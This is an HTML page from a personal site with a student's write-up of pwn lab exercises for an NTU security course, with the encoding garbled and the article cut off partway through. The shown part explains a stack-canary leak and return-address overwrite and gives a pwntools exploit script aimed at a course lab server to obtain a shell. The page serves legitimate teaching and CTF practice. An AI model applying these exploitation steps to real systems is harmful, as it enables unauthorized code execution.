<!doctype html><html lang=en-us dir=ltr itemscope itemtype=http://schema.org/Article data-r-output-format=html><head><meta charset=utf-8><meta name=viewport content="height=device-height,width=device-width,initial-scale=1,minimum-scale=1"><meta name=generator content="Hugo 0.145.0"><meta name=generator content="Relearn 7.6.0+b932d301d7838f3c1a50e318e216b55ce5cc9148"><meta name=description content="NTU CS 2023 HW3 Write Up Lab-Stackoverflow Flag: flag{Y0u_know_hoW2L3@k_canAry}
è§£é¡Œæµç¨‹èˆ‡æ€è·¯ é€™ä¸€é¡Œå°±æ˜¯å‰ä¸€å¹´çš„Leak Canaryçš„æ‡‰ç”¨ç‰ˆï¼Œç•¶æ™‚æ˜¯ç”¨pwndbgï¼Œé‚„ä¸çŸ¥é“gefçš„å‰å¤§ï¼Œç¸½ä¹‹é€™ä¸€é¡Œçš„æ€è·¯å°±æ˜¯:
æ¥æ”¶é–‹shellçš„functionçš„address(win function) æ¥æ”¶0x20å€‹bytesï¼Œåˆ†åˆ¥ä»£è¡¨RSP value/Stack Canary/RBP value/RIP å‚³é€payloadéå»ï¼Œåˆ†åˆ¥æ˜¯p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr) é€™æ¨£å°±å¯ä»¥è“‹åˆ°RIPå¾Œåˆä¸æœƒè¢«åµæ¸¬åˆ°canaryè¢«æ”¹è®Šï¼Œreturnä¹‹å¾Œæ‹¿åˆ°shell :::info æ¯”è¼ƒå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå› ç‚ºæˆ‘æ˜¯åœ¨å…¬å¸ƒè§£ç­”å‰å…ˆè‡ªå·±å¯«ï¼Œé‡åˆ°äº†returnä¹‹å¾Œæ‹¿ä¸åˆ°shellçš„å•é¡Œï¼Œå¾Œä¾†ç¶“éåŠ©æ•™çš„è§£é‡‹æ‰çŸ¥é“åŸä¾†æ˜¯ï¼Œé–‹shellçš„éç¨‹ä¸­<do_system+115> movaps XMMWORD PTR [rsp], xmm1ï¼ŒRSPå¿…é ˆè¦æ˜¯å°é½Šçš„ç‹€æ…‹ï¼Œä¹Ÿå°±æ˜¯æœ€å¾Œæ‡‰è©²è¦æ˜¯0ï¼Œä½†å¯ä»¥çœ‹ä¸‹åœ–ï¼Œå¦‚æœç›´æ¥è·³åˆ°win functionçš„é–‹é ­ï¼Œrspå°±ä¸æ˜¯0ï¼Œæœƒåç§»8 bytesï¼Œæ‰€ä»¥æœƒå‡ºç¾SIGSEGV è§£æ±ºæ–¹å¼æœ‰å…©å€‹ï¼Œä¸€å€‹æ˜¯å°‘pushä¸€æ¬¡ï¼Œä¸€å€‹æ˜¯å¤špopä¸€æ¬¡ï¼Œé€™æ¨£å°±å¯ä»¥æ ¡æ­£RSPå›åˆ°0çµå°¾çš„ç‹€æ…‹ï¼Œæ‰€ä»¥æˆ‘å€‘æ‰è¦åœ¨RIPçš„åœ°æ–¹åŠ ä¸Š(0xf1-0xe9)çš„offsetï¼Œè®“RIPå¯ä»¥å°‘pushä¸€æ¬¡ï¼Œé€™æ¨£å°±å¯ä»¥è§£æ±ºå•é¡Œ :::
Exploit - Leak Canary + Control RIP from pwn import * # r = process('./lab') r = remote('10.113.184.121', 10041) r.recvuntil(b'Gift: 0x') win_addr = int(r.recvline().strip(), 16) + (0xf1 - 0xe9) r.recvuntil(b'Gift2: ') rsp_val = u64(r.recv(0x8)) stack_canary = u64(r.recv(0x8)) rbp_val = u64(r.recv(0x8)) rip = u64(r.recv(0x8)) log.info(f'win address = {hex(win_addr)}') log.info(f'RSP value = {hex(rsp_val)}') log.info(f'Stack Canary = {hex(stack_canary)}') log.info(f'RBP value = {hex(rbp_val)}') log.info(f'RIP value = {hex(rip)}') payload = p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr) log.info(f'Payload = {payload}') # raw_input() r.sendline(payload) r.interactive() Lab-Shellcode Flag: flag{How_you_do0o0o0o_sysca1111111}"><meta name=author content><meta name=twitter:card content="summary"><meta name=twitter:title content="NTU CS 2023 HW3 Write Up :: SBK Hugo Site"><meta name=twitter:description content="NTU CS 2023 HW3 Write Up Lab-Stackoverflow Flag: flag{Y0u_know_hoW2L3@k_canAry}
è§£é¡Œæµç¨‹èˆ‡æ€è·¯ é€™ä¸€é¡Œå°±æ˜¯å‰ä¸€å¹´çš„Leak Canaryçš„æ‡‰ç”¨ç‰ˆï¼Œç•¶æ™‚æ˜¯ç”¨pwndbgï¼Œé‚„ä¸çŸ¥é“gefçš„å‰å¤§ï¼Œç¸½ä¹‹é€™ä¸€é¡Œçš„æ€è·¯å°±æ˜¯:
æ¥æ”¶é–‹shellçš„functionçš„address(win function) æ¥æ”¶0x20å€‹bytesï¼Œåˆ†åˆ¥ä»£è¡¨RSP value/Stack Canary/RBP value/RIP å‚³é€payloadéå»ï¼Œåˆ†åˆ¥æ˜¯p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr) é€™æ¨£å°±å¯ä»¥è“‹åˆ°RIPå¾Œåˆä¸æœƒè¢«åµæ¸¬åˆ°canaryè¢«æ”¹è®Šï¼Œreturnä¹‹å¾Œæ‹¿åˆ°shell :::info æ¯”è¼ƒå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå› ç‚ºæˆ‘æ˜¯åœ¨å…¬å¸ƒè§£ç­”å‰å…ˆè‡ªå·±å¯«ï¼Œé‡åˆ°äº†returnä¹‹å¾Œæ‹¿ä¸åˆ°shellçš„å•é¡Œï¼Œå¾Œä¾†ç¶“éåŠ©æ•™çš„è§£é‡‹æ‰çŸ¥é“åŸä¾†æ˜¯ï¼Œé–‹shellçš„éç¨‹ä¸­<do_system+115> movaps XMMWORD PTR [rsp], xmm1ï¼ŒRSPå¿…é ˆè¦æ˜¯å°é½Šçš„ç‹€æ…‹ï¼Œä¹Ÿå°±æ˜¯æœ€å¾Œæ‡‰è©²è¦æ˜¯0ï¼Œä½†å¯ä»¥çœ‹ä¸‹åœ–ï¼Œå¦‚æœç›´æ¥è·³åˆ°win functionçš„é–‹é ­ï¼Œrspå°±ä¸æ˜¯0ï¼Œæœƒåç§»8 bytesï¼Œæ‰€ä»¥æœƒå‡ºç¾SIGSEGV è§£æ±ºæ–¹å¼æœ‰å…©å€‹ï¼Œä¸€å€‹æ˜¯å°‘pushä¸€æ¬¡ï¼Œä¸€å€‹æ˜¯å¤špopä¸€æ¬¡ï¼Œé€™æ¨£å°±å¯ä»¥æ ¡æ­£RSPå›åˆ°0çµå°¾çš„ç‹€æ…‹ï¼Œæ‰€ä»¥æˆ‘å€‘æ‰è¦åœ¨RIPçš„åœ°æ–¹åŠ ä¸Š(0xf1-0xe9)çš„offsetï¼Œè®“RIPå¯ä»¥å°‘pushä¸€æ¬¡ï¼Œé€™æ¨£å°±å¯ä»¥è§£æ±ºå•é¡Œ :::
Exploit - Leak Canary + Control RIP from pwn import * # r = process('./lab') r = remote('10.113.184.121', 10041) r.recvuntil(b'Gift: 0x') win_addr = int(r.recvline().strip(), 16) + (0xf1 - 0xe9) r.recvuntil(b'Gift2: ') rsp_val = u64(r.recv(0x8)) stack_canary = u64(r.recv(0x8)) rbp_val = u64(r.recv(0x8)) rip = u64(r.recv(0x8)) log.info(f'win address = {hex(win_addr)}') log.info(f'RSP value = {hex(rsp_val)}') log.info(f'Stack Canary = {hex(stack_canary)}') log.info(f'RBP value = {hex(rbp_val)}') log.info(f'RIP value = {hex(rip)}') payload = p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr) log.info(f'Payload = {payload}') # raw_input() r.sendline(payload) r.interactive() Lab-Shellcode Flag: flag{How_you_do0o0o0o_sysca1111111}"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/pwn/ntu-cs-2023-hw3-write-up/index.html"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="NTU CS 2023 HW3 Write Up :: SBK Hugo Site"><meta property="og:description" content="NTU CS 2023 HW3 Write Up Lab-Stackoverflow Flag: flag{Y0u_know_hoW2L3@k_canAry}
è§£é¡Œæµç¨‹èˆ‡æ€è·¯ é€™ä¸€é¡Œå°±æ˜¯å‰ä¸€å¹´çš„Leak Canaryçš„æ‡‰ç”¨ç‰ˆï¼Œç•¶æ™‚æ˜¯ç”¨pwndbgï¼Œé‚„ä¸çŸ¥é“gefçš„å‰å¤§ï¼Œç¸½ä¹‹é€™ä¸€é¡Œçš„æ€è·¯å°±æ˜¯:
æ¥æ”¶é–‹shellçš„functionçš„address(win function) æ¥æ”¶0x20å€‹bytesï¼Œåˆ†åˆ¥ä»£è¡¨RSP value/Stack Canary/RBP value/RIP å‚³é€payloadéå»ï¼Œåˆ†åˆ¥æ˜¯p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr) é€™æ¨£å°±å¯ä»¥è“‹åˆ°RIPå¾Œåˆä¸æœƒè¢«åµæ¸¬åˆ°canaryè¢«æ”¹è®Šï¼Œreturnä¹‹å¾Œæ‹¿åˆ°shell :::info æ¯”è¼ƒå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå› ç‚ºæˆ‘æ˜¯åœ¨å…¬å¸ƒè§£ç­”å‰å…ˆè‡ªå·±å¯«ï¼Œé‡åˆ°äº†returnä¹‹å¾Œæ‹¿ä¸åˆ°shellçš„å•é¡Œï¼Œå¾Œä¾†ç¶“éåŠ©æ•™çš„è§£é‡‹æ‰çŸ¥é“åŸä¾†æ˜¯ï¼Œé–‹shellçš„éç¨‹ä¸­<do_system+115> movaps XMMWORD PTR [rsp], xmm1ï¼ŒRSPå¿…é ˆè¦æ˜¯å°é½Šçš„ç‹€æ…‹ï¼Œä¹Ÿå°±æ˜¯æœ€å¾Œæ‡‰è©²è¦æ˜¯0ï¼Œä½†å¯ä»¥çœ‹ä¸‹åœ–ï¼Œå¦‚æœç›´æ¥è·³åˆ°win functionçš„é–‹é ­ï¼Œrspå°±ä¸æ˜¯0ï¼Œæœƒåç§»8 bytesï¼Œæ‰€ä»¥æœƒå‡ºç¾SIGSEGV è§£æ±ºæ–¹å¼æœ‰å…©å€‹ï¼Œä¸€å€‹æ˜¯å°‘pushä¸€æ¬¡ï¼Œä¸€å€‹æ˜¯å¤špopä¸€æ¬¡ï¼Œé€™æ¨£å°±å¯ä»¥æ ¡æ­£RSPå›åˆ°0çµå°¾çš„ç‹€æ…‹ï¼Œæ‰€ä»¥æˆ‘å€‘æ‰è¦åœ¨RIPçš„åœ°æ–¹åŠ ä¸Š(0xf1-0xe9)çš„offsetï¼Œè®“RIPå¯ä»¥å°‘pushä¸€æ¬¡ï¼Œé€™æ¨£å°±å¯ä»¥è§£æ±ºå•é¡Œ :::
Exploit - Leak Canary + Control RIP from pwn import * # r = process('./lab') r = remote('10.113.184.121', 10041) r.recvuntil(b'Gift: 0x') win_addr = int(r.recvline().strip(), 16) + (0xf1 - 0xe9) r.recvuntil(b'Gift2: ') rsp_val = u64(r.recv(0x8)) stack_canary = u64(r.recv(0x8)) rbp_val = u64(r.recv(0x8)) rip = u64(r.recv(0x8)) log.info(f'win address = {hex(win_addr)}') log.info(f'RSP value = {hex(rsp_val)}') log.info(f'Stack Canary = {hex(stack_canary)}') log.info(f'RBP value = {hex(rbp_val)}') log.info(f'RIP value = {hex(rip)}') payload = p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr) log.info(f'Payload = {payload}') # raw_input() r.sendline(payload) r.interactive() Lab-Shellcode Flag: flag{How_you_do0o0o0o_sysca1111111}"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="Securities"><meta property="article:tag" content="Eductf"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><meta itemprop=name content="NTU CS 2023 HW3 Write Up :: SBK Hugo Site"><meta itemprop=description content="NTU CS 2023 HW3 Write Up Lab-Stackoverflow Flag: flag{Y0u_know_hoW2L3@k_canAry}
è§£é¡Œæµç¨‹èˆ‡æ€è·¯ é€™ä¸€é¡Œå°±æ˜¯å‰ä¸€å¹´çš„Leak Canaryçš„æ‡‰ç”¨ç‰ˆï¼Œç•¶æ™‚æ˜¯ç”¨pwndbgï¼Œé‚„ä¸çŸ¥é“gefçš„å‰å¤§ï¼Œç¸½ä¹‹é€™ä¸€é¡Œçš„æ€è·¯å°±æ˜¯:
æ¥æ”¶é–‹shellçš„functionçš„address(win function) æ¥æ”¶0x20å€‹bytesï¼Œåˆ†åˆ¥ä»£è¡¨RSP value/Stack Canary/RBP value/RIP å‚³é€payloadéå»ï¼Œåˆ†åˆ¥æ˜¯p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr) é€™æ¨£å°±å¯ä»¥è“‹åˆ°RIPå¾Œåˆä¸æœƒè¢«åµæ¸¬åˆ°canaryè¢«æ”¹è®Šï¼Œreturnä¹‹å¾Œæ‹¿åˆ°shell :::info æ¯”è¼ƒå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå› ç‚ºæˆ‘æ˜¯åœ¨å…¬å¸ƒè§£ç­”å‰å…ˆè‡ªå·±å¯«ï¼Œé‡åˆ°äº†returnä¹‹å¾Œæ‹¿ä¸åˆ°shellçš„å•é¡Œï¼Œå¾Œä¾†ç¶“éåŠ©æ•™çš„è§£é‡‹æ‰çŸ¥é“åŸä¾†æ˜¯ï¼Œé–‹shellçš„éç¨‹ä¸­<do_system+115> movaps XMMWORD PTR [rsp], xmm1ï¼ŒRSPå¿…é ˆè¦æ˜¯å°é½Šçš„ç‹€æ…‹ï¼Œä¹Ÿå°±æ˜¯æœ€å¾Œæ‡‰è©²è¦æ˜¯0ï¼Œä½†å¯ä»¥çœ‹ä¸‹åœ–ï¼Œå¦‚æœç›´æ¥è·³åˆ°win functionçš„é–‹é ­ï¼Œrspå°±ä¸æ˜¯0ï¼Œæœƒåç§»8 bytesï¼Œæ‰€ä»¥æœƒå‡ºç¾SIGSEGV è§£æ±ºæ–¹å¼æœ‰å…©å€‹ï¼Œä¸€å€‹æ˜¯å°‘pushä¸€æ¬¡ï¼Œä¸€å€‹æ˜¯å¤špopä¸€æ¬¡ï¼Œé€™æ¨£å°±å¯ä»¥æ ¡æ­£RSPå›åˆ°0çµå°¾çš„ç‹€æ…‹ï¼Œæ‰€ä»¥æˆ‘å€‘æ‰è¦åœ¨RIPçš„åœ°æ–¹åŠ ä¸Š(0xf1-0xe9)çš„offsetï¼Œè®“RIPå¯ä»¥å°‘pushä¸€æ¬¡ï¼Œé€™æ¨£å°±å¯ä»¥è§£æ±ºå•é¡Œ :::
Exploit - Leak Canary + Control RIP from pwn import * # r = process('./lab') r = remote('10.113.184.121', 10041) r.recvuntil(b'Gift: 0x') win_addr = int(r.recvline().strip(), 16) + (0xf1 - 0xe9) r.recvuntil(b'Gift2: ') rsp_val = u64(r.recv(0x8)) stack_canary = u64(r.recv(0x8)) rbp_val = u64(r.recv(0x8)) rip = u64(r.recv(0x8)) log.info(f'win address = {hex(win_addr)}') log.info(f'RSP value = {hex(rsp_val)}') log.info(f'Stack Canary = {hex(stack_canary)}') log.info(f'RBP value = {hex(rbp_val)}') log.info(f'RIP value = {hex(rip)}') payload = p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr) log.info(f'Payload = {payload}') # raw_input() r.sendline(payload) r.interactive() Lab-Shellcode Flag: flag{How_you_do0o0o0o_sysca1111111}"><meta itemprop=wordCount content="2807"><meta itemprop=keywords content="Eductf,CTF,PWN"><title>NTU CS 2023 HW3 Write Up :: SBK Hugo Site</title>
<link href=/fonts/fontawesome/css/fontawesome-all.min.css?1743619851 rel=stylesheet media=print onload='this.media="all",this.onload=null'><noscript><link href=/fonts/fontawesome/css/fontawesome-all.min.css?1743619851 rel=stylesheet></noscript><link href=/css/perfect-scrollbar/perfect-scrollbar.min.css?1743619851 rel=stylesheet><link href=/css/theme.min.css?1743619851 rel=stylesheet><link href=/css/format-html.min.css?1743619851 rel=stylesheet id=R-format-style><link href=/css/auto-complete/auto-complete.min.css?1743619851 rel=stylesheet><script src=/js/auto-complete/auto-complete.min.js?1743619851 defer></script><script src=/js/lunr/lunr.min.js?1743619851 defer></script><script src=/js/lunr/lunr.stemmer.support.min.js?1743619851 defer></script><script src=/js/lunr/lunr.multi.min.js?1743619851 defer></script><script src=/js/lunr/lunr.en.min.js?1743619851 defer></script><script src=/js/search.min.js?1743619851 defer></script><script>window.relearn=window.relearn||{},window.relearn.min=`.min`,window.relearn.path="/security/course/ntu-cs/pwn/ntu-cs-2023-hw3-write-up/index.html",window.relearn.relBasePath="../../../../..",window.relearn.relBaseUri="../../../../..",window.relearn.absBaseUri="https://bernie6401.github.io",window.relearn.contentLangs=["en"],window.relearn.index_js_url="/searchindex.en.js?1743619851",window.relearn.disableAnchorCopy=!1,window.relearn.disableAnchorScrolling=!1,window.relearn.disableInlineCopyToClipboard=!1,window.relearn.enableBlockCodeWrap=!0,window.relearn.getItem=(e,t)=>e.getItem(t),window.relearn.setItem=(e,t,n)=>e.setItem(t,n),window.relearn.removeItem=(e,t)=>e.removeItem(t),window.relearn.themevariants=["auto"],window.relearn.customvariantname="my-custom-variant",window.relearn.changeVariant=function(e){var t=document.documentElement.dataset.rThemeVariant;window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e),document.documentElement.dataset.rThemeVariant=e,t!=e&&(document.dispatchEvent(new CustomEvent("themeVariantLoaded",{detail:{variant:e,oldVariant:t}})),window.relearn.markVariant())},window.relearn.markVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant");document.querySelectorAll(".R-variantswitcher select").forEach(t=>{t.value=e})},window.relearn.initVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant")??"";e==window.relearn.customvariantname||(!e||!window.relearn.themevariants.includes(e))&&(e=window.relearn.themevariants[0],window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e)),document.documentElement.dataset.rThemeVariant=e},window.relearn.initVariant(),window.relearn.markVariant(),window.T_Copy_to_clipboard=`Copy to clipboard`,window.T_Copied_to_clipboard=`Copied to clipboard!`,window.T_Copy_link_to_clipboard=`Copy link to clipboard`,window.T_Link_copied_to_clipboard=`Copied link to clipboard!`,window.T_Reset_view=`Reset view`,window.T_View_reset=`View reset!`,window.T_No_results_found=`No results found for "{0}"`,window.T_N_results_found=`{1} results found for "{0}"`</script></head><body class="mobile-support html" data-url=/security/course/ntu-cs/pwn/ntu-cs-2023-hw3-write-up/index.html><div id=R-body class=default-animation><div id=R-body-overlay></div><nav id=R-topbar><div class=topbar-wrapper><div class=topbar-sidebar-divider></div><div class="topbar-area topbar-area-start" data-area=start><div class="topbar-button topbar-button-sidebar" data-content-empty=disable data-width-s=show data-width-m=hide data-width-l=hide><button class=topbar-control onclick=toggleNav() type=button title="Menu (CTRL+ALT+n)"><i class="fa-fw fas fa-bars"></i></button></div><div class="topbar-button topbar-button-toc" data-content-empty=hide data-width-s=show data-width-m=show data-width-l=show><button class=topbar-control onclick=toggleTopbarFlyout(this) type=button title="Table of Contents (CTRL+ALT+t)"><i class="fa-fw fas fa-list-alt"></i></button><div class=topbar-content><div class=topbar-content-wrapper><nav class=TableOfContents><ul><li><a href=#lab-stackoverflow>Lab-Stackoverflow</a><ul><li><a href=#è§£é¡Œæµç¨‹èˆ‡æ€è·¯>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</a></li><li><a href=#exploit---leak-canary--control-rip>Exploit - Leak Canary + Control RIP</a></li></ul></li><li><a href=#lab-shellcode>Lab-Shellcode</a><ul><li><a href=#è§£é¡Œæµç¨‹èˆ‡æ€è·¯-1>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</a></li><li><a href=#exploit>Exploit</a></li></ul></li><li><a href=#lab-got>Lab-Got</a><ul><li><a href=#è§£é¡Œæµç¨‹èˆ‡æ€è·¯-2>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</a></li><li><a href=#exploit-1>Exploit</a></li></ul></li><li><a href=#hw-notepad-stage1>HW-Notepad-Stage1</a><ul><li><a href=#è§£é¡Œæµç¨‹èˆ‡æ€è·¯-3>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</a></li></ul></li><li><a href=#hw-notepad-stage2>HW-Notepad-Stage2</a><ul><li><a href=#è§£é¡Œæµç¨‹èˆ‡æ€è·¯-4>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</a></li></ul></li><li><a href=#hw-notepad-stage3>HW-Notepad-Stage3</a><ul><li><a href=#è§£é¡Œæµç¨‹èˆ‡æ€è·¯-5>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</a></li></ul></li><li><a href=#lab-rop_rw>Lab-ROP_RW</a><ul><li><a href=#è§£é¡Œæµç¨‹èˆ‡æ€è·¯-6>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</a></li></ul></li><li><a href=#lab-rop_syscall>Lab-ROP_Syscall</a><ul><li><a href=#è§£é¡Œæµç¨‹èˆ‡æ€è·¯-7>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</a></li><li><a href=#exploit-2>Exploit</a></li></ul></li><li><a href=#lab-ret2plt>Lab-ret2plt</a><ul><li><a href=#è§£é¡Œæµç¨‹èˆ‡æ€è·¯-8>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</a></li></ul></li><li><a href=#lab-stack-pivot>Lab-Stack Pivot</a><ul><li><a href=#è§£é¡Œæµç¨‹èˆ‡æ€è·¯-9>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</a></li></ul></li><li><a href=#lab-fmt>Lab-FMT</a><ul><li><a href=#è§£é¡Œæµç¨‹èˆ‡æ€è·¯-10>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</a></li></ul></li><li><a href=#hw-hachama>HW-HACHAMA</a><ul><li><a href=#è§£é¡Œæµç¨‹èˆ‡æ€è·¯-11>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</a></li></ul></li><li><a href=#lab-uaf>Lab-UAF</a><ul><li><a href=#è§£é¡Œæµç¨‹èˆ‡æ€è·¯-12>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</a></li></ul></li><li><a href=#lab-double-free>Lab-Double Free</a><ul><li><a href=#è§£é¡Œæµç¨‹èˆ‡æ€è·¯-13>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</a></li></ul></li><li><a href=#hw-uaf>HW-UAF++</a><ul><li><a href=#è§£é¡Œæµç¨‹èˆ‡æ€è·¯-14>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</a></li></ul></li></ul></nav></div></div></div></div><ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype=http://schema.org/BreadcrumbList><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=/index.html><span itemprop=name>SBK Hugo Site</span></a><meta itemprop=position content="1">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=/security/index.html><span itemprop=name>Securities</span></a><meta itemprop=position content="2">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><span itemprop=name>NTU CS 2023 HW3 Write Up</span><meta itemprop=position content="3"></li></ol><div class="topbar-area topbar-area-end" data-area=end><div class="topbar-button topbar-button-prev" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><a class=topbar-control href=/security/course/ntu-cs/reverse/ntu-cs-2023-hw2-write-up/index.html title="NTU CS 2023 HW2 Write Up (ğŸ¡)"><i class="fa-fw fas fa-chevron-left"></i></a></div><div class="topbar-button topbar-button-next" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><a class=topbar-control href=/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/index.html title="NTU CS 2023 HW4 Write Up (ğŸ¡’)"><i class="fa-fw fas fa-chevron-right"></i></a></div><div class="topbar-button topbar-button-more" data-content-empty=hide data-width-s=show data-width-m=show data-width-l=show><button class=topbar-control onclick=toggleTopbarFlyout(this) type=button title=More><i class="fa-fw fas fa-ellipsis-v"></i></button><div class=topbar-content><div class=topbar-content-wrapper><div class="topbar-area topbar-area-more" data-area=more></div></div></div></div></div></div></nav><div id=R-main-overlay></div><main id=R-body-inner class="highlightable security" tabindex=-1><div class=flex-block-wrapper><article class=default><header class=headline><div class="R-taxonomy taxonomy-tags cstyle tags" title=Tags style=--VARIABLE-TAGS-BG-color:var(--INTERNAL-TAG-BG-color)><ul><li><a class=term-link href=/tags/ctf/index.html>CTF</a></li><li><a class=term-link href=/tags/eductf/index.html>Eductf</a></li><li><a class=term-link href=/tags/pwn/index.html>PWN</a></li></ul></div></header><h1 id=ntu-cs-2023-hw3-write-up>NTU CS 2023 HW3 Write Up</h1><h1 id=ntu-cs-2023-hw3-write-up>NTU CS 2023 HW3 Write Up</h1><h2 id=lab-stackoverflow>Lab-Stackoverflow</h2><p>Flag: <code>flag{Y0u_know_hoW2L3@k_canAry}</code></p><h3 id=è§£é¡Œæµç¨‹èˆ‡æ€è·¯>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</h3><p>é€™ä¸€é¡Œå°±æ˜¯å‰ä¸€å¹´çš„<a href=https://hackmd.io/@SBK6401/BJijt4A9s rel=external target=_blank>Leak Canary</a>çš„æ‡‰ç”¨ç‰ˆï¼Œç•¶æ™‚æ˜¯ç”¨pwndbgï¼Œé‚„ä¸çŸ¥é“gefçš„å‰å¤§ï¼Œç¸½ä¹‹é€™ä¸€é¡Œçš„æ€è·¯å°±æ˜¯:</p><ol><li>æ¥æ”¶é–‹shellçš„functionçš„address(win function)</li><li>æ¥æ”¶0x20å€‹bytesï¼Œåˆ†åˆ¥ä»£è¡¨RSP value/Stack Canary/RBP value/RIP</li><li>å‚³é€payloadéå»ï¼Œåˆ†åˆ¥æ˜¯<code>p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr)</code></li><li>é€™æ¨£å°±å¯ä»¥è“‹åˆ°RIPå¾Œåˆä¸æœƒè¢«åµæ¸¬åˆ°canaryè¢«æ”¹è®Šï¼Œreturnä¹‹å¾Œæ‹¿åˆ°shell</li></ol><p>:::info
æ¯”è¼ƒå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå› ç‚ºæˆ‘æ˜¯åœ¨å…¬å¸ƒè§£ç­”å‰å…ˆè‡ªå·±å¯«ï¼Œé‡åˆ°äº†returnä¹‹å¾Œæ‹¿ä¸åˆ°shellçš„å•é¡Œï¼Œå¾Œä¾†ç¶“éåŠ©æ•™çš„è§£é‡‹æ‰çŸ¥é“åŸä¾†æ˜¯ï¼Œé–‹shellçš„éç¨‹ä¸­<code>&lt;do_system+115> movaps XMMWORD PTR [rsp], xmm1</code>ï¼ŒRSPå¿…é ˆè¦æ˜¯å°é½Šçš„ç‹€æ…‹ï¼Œä¹Ÿå°±æ˜¯æœ€å¾Œæ‡‰è©²è¦æ˜¯0ï¼Œä½†å¯ä»¥çœ‹ä¸‹åœ–ï¼Œå¦‚æœç›´æ¥è·³åˆ°win functionçš„é–‹é ­ï¼Œrspå°±ä¸æ˜¯0ï¼Œæœƒåç§»8 bytesï¼Œæ‰€ä»¥æœƒå‡ºç¾SIGSEGV
<a href=#R-image-af147bb3bfe16aaf9f0924c82d448ec4 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/rJK-2d0ma.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-af147bb3bfe16aaf9f0924c82d448ec4><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/rJK-2d0ma.png></a></p><p>è§£æ±ºæ–¹å¼æœ‰å…©å€‹ï¼Œä¸€å€‹æ˜¯å°‘pushä¸€æ¬¡ï¼Œä¸€å€‹æ˜¯å¤špopä¸€æ¬¡ï¼Œé€™æ¨£å°±å¯ä»¥æ ¡æ­£RSPå›åˆ°0çµå°¾çš„ç‹€æ…‹ï¼Œæ‰€ä»¥æˆ‘å€‘æ‰è¦åœ¨RIPçš„åœ°æ–¹åŠ ä¸Š(0xf1-0xe9)çš„offsetï¼Œè®“RIPå¯ä»¥å°‘pushä¸€æ¬¡ï¼Œé€™æ¨£å°±å¯ä»¥è§£æ±ºå•é¡Œ
<a href=#R-image-369563560d8667c76cd5e009bd410b8d class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/ByhF2OCQa.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-369563560d8667c76cd5e009bd410b8d><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/ByhF2OCQa.png></a></p><p><a href=#R-image-fb13d267226ffd3ff160ddf1a0f66a0c class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/SyxvoO0Xa.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-fb13d267226ffd3ff160ddf1a0f66a0c><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/SyxvoO0Xa.png></a>
:::</p><h3 id=exploit---leak-canary--control-rip>Exploit - Leak Canary + Control RIP</h3><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class="language-python=" data-lang="python=">from pwn import *

# r = process(&#39;./lab&#39;)
r = remote(&#39;10.113.184.121&#39;, 10041)

r.recvuntil(b&#39;Gift: 0x&#39;)
win_addr = int(r.recvline().strip(), 16) + (0xf1 - 0xe9)
r.recvuntil(b&#39;Gift2: &#39;)
rsp_val = u64(r.recv(0x8))
stack_canary = u64(r.recv(0x8))
